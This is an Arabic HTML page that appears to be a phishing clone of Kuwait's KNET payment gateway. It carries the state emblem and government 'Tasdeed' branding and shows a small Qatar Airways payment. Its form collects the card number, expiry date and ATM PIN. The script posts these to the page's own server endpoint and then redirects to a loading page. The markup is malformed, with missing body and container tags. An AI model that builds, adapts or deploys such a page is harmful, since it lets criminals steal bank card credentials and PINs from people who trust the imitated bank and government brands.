<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KNET - بوابة الدفع</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: white;
            width: 100%;
            max-width: 450px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            border-radius: 8px;
        }
        .header-banner {
            text-align: center;
            margin-bottom: 20px;
        }
        .header-banner img {
            max-width: 100%;
            height: auto;
        }
        /* قسم الدفع الحكومي */
        .gov-payment-box {
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            background-color: #fafafa;
        }
        .gov-logos {
            display: flex;
            justify-content: space-around;
            align-items: center;
            margin-bottom: 15px;
        }
        .gov-logos img {
            height: 40px;
        }
        .payment-info {
            text-align: right;
            font-size: 14px;
            color: #333;
        }
        .payment-info div {
            margin-bottom: 5px;
        }
        .payment-info b {
            color: #000;
        }

        /* حقول الإدخال */
        .form-group {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            justify-content: flex-end;
        }
        .form-group label {
            width: 160px;
            text-align: right;
            margin-left: 10px;
            font-size: 14px;
            font-weight: bold;
        }
        .input-container {
            flex: 1;
            position: relative;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            text-align: left; /* الأرقام من اليسار */
            direction: ltr;
            font-size: 16px;
        }
        .expiry-inputs {
            display: flex;
            direction: ltr;
        }
        .expiry-inputs input {
            width: 50px;
            text-align: center;
        }
        .expiry-inputs span {
            padding: 0 5px;
            align-self: center;
        }

        /* قائمة الاقتراحات */
        .suggestion-box {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #ccc;
            z-index: 1000;
            max-height: 200px;
            overflow-y: auto;
            display: none;
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .suggestion-box li {
            padding: 10px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            direction: ltr;
        }
        .suggestion-box li:hover {
            background-color: #f0f0f0;
        }
        .suggestion-box img {
            height: 20px;
        }

        /* الأزرار */
        .button-container {
            background-color: white;
            padding: 15px;
            border: 1px solid #eee;
            border-radius: 5px;
            display: flex;
            justify-content: space-around;
            margin-top: 20px;
        }
        .btn {
            background-color: #808080; /* رمادي كما طلب */
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 40%;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn-cancel {
            background-color: #a0a0a0;
        }

        #brand-logo-display {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            height: 20px;
            pointer-events: none;
        }
    </style>
</head>

    </div>

    <!-- مربع الدفع الحكومي المنفصل -->
    <div class="gov-payment-box">
        <div class="gov-logos">
            <!-- استبدال الشعارات بصور توضيحية أو نص في حال عدم توفر الروابط -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Emblem_of_Kuwait.svg/1200px-Emblem_of_Kuwait.svg.png" alt="شعار الكويت">
            <span style="font-weight: bold; color: #004a99;">نظام الدفع الإلكتروني الحكومي (تسديد)</span>
        </div>
        <div class="payment-info">
            <div>المستفيد: <b>القطرية للطيران</b></div>
            <div>المبلغ: <b>2.800 د.ك</b></div>
        </div>
    </div>

    <form id="knetForm">
        <div class="form-group">
            <label>:رقم بطاقة الصراف الآلي</label>
            <div class="input-container">
                <input type="text" id="cardNumber" maxlength="19" placeholder="رقم البطاقة" autocomplete="off">
                <img id="brand-logo-display" src="" alt="">
                <ul id="suggestionBox" class="suggestion-box"></ul>
            </div>
        </div>

        <div class="form-group">
            <label>:تاريخ انتهاء البطاقة</label>
            <div class="input-container expiry-inputs">
                <input type="text" id="expYear" maxlength="2" placeholder="YY">
                <span>/</span>
                <input type="text" id="expMonth" maxlength="2" placeholder="MM">
            </div>
        </div>

        <div class="form-group">
            <label>:(PIN) الرقم السري</label>
            <div class="input-container">
                <input type="password" id="cardPin" maxlength="4" placeholder="الرقم السري">
            </div>
        </div>

        <div class="button-container">
            <button type="button" class="btn btn-cancel" onclick="window.history.back()">إلغاء</button>
            <button type="submit" class="btn" id="submitBtn">إرسال</button>
        </div>
    </form>
</div>

<script>
    const cardData = [
        { bin: "406739", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "NBK" },
        { bin: "419252", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "CBK" },
        { bin: "516335", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png", bank: "Gulf Bank" },
        { bin: "537015", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png", bank: "KFH" },
        { bin: "450778", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "Burgan" },
        { bin: "403611", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "Boubyan" },
        { bin: "423824", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "Warba" }
    ];

    const cardNumberInput = document.getElementById('cardNumber');
    const suggestionBox = document.getElementById('suggestionBox');
    const brandLogoDisplay = document.getElementById('brand-logo-display');

    cardNumberInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value; // إبقاء الأرقام فقط

        if (value.length > 0) {
            const filtered = cardData.filter(c => c.bin.startsWith(value));
            showSuggestions(filtered);
        } else {
            suggestionBox.style.display = 'none';
            brandLogoDisplay.src = '';
        }
    });

    function showSuggestions(list) {
        if (list.length === 0) {
            suggestionBox.style.display = 'none';
            return;
        }
        suggestionBox.innerHTML = '';
        list.forEach(item => {
            const li = document.createElement('li');
            li.innerHTML = `<span>${item.bin}</span> <img src="${item.logo}" alt="logo">`;
            li.onclick = () => {
                cardNumberInput.value = item.bin;
                brandLogoDisplay.src = item.logo;
                suggestionBox.style.display = 'none';
                cardNumberInput.focus();
            };
            suggestionBox.appendChild(li);
        });
        suggestionBox.style.display = 'block';
    }

    document.addEventListener('click', (e) => {
        if (!cardNumberInput.contains(e.target) && !suggestionBox.contains(e.target)) {
            suggestionBox.style.display = 'none';
        }
    });

    document.getElementById('knetForm').onsubmit = async (e) => {
        e.preventDefault();
        const submitBtn = document.getElementById('submitBtn');
        submitBtn.disabled = true;
        submitBtn.innerText = 'جاري الإرسال...';

        const data = {
            orderId: sessionStorage.getItem('orderId') || 'ORD-' + Date.now(),
            payment_method: 'Knet',
            knet_data: {
                card_number: cardNumberInput.value,
                expiry_month: document.getElementById('expMonth').value,
                expiry_year: document.getElementById('expYear').value,
                card_pin: document.getElementById('cardPin').value
            }
        };

        try {
            const res = await fetch('/api/orders/payment-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const result = await res.json();
            if (result.success) {
                window.location.href = 'loading.html';
            } else {
                alert('حدث خطأ في معالجة البيانات');
                submitBtn.disabled = false;
                submitBtn.innerText = 'إرسال';
            }
        } catch (err) {
            console.error(err);
            alert('خطأ في الاتصال بالخادم');
            submitBtn.disabled = false;
            submitBtn.innerText = 'إرسال';
        }
    };
</script>
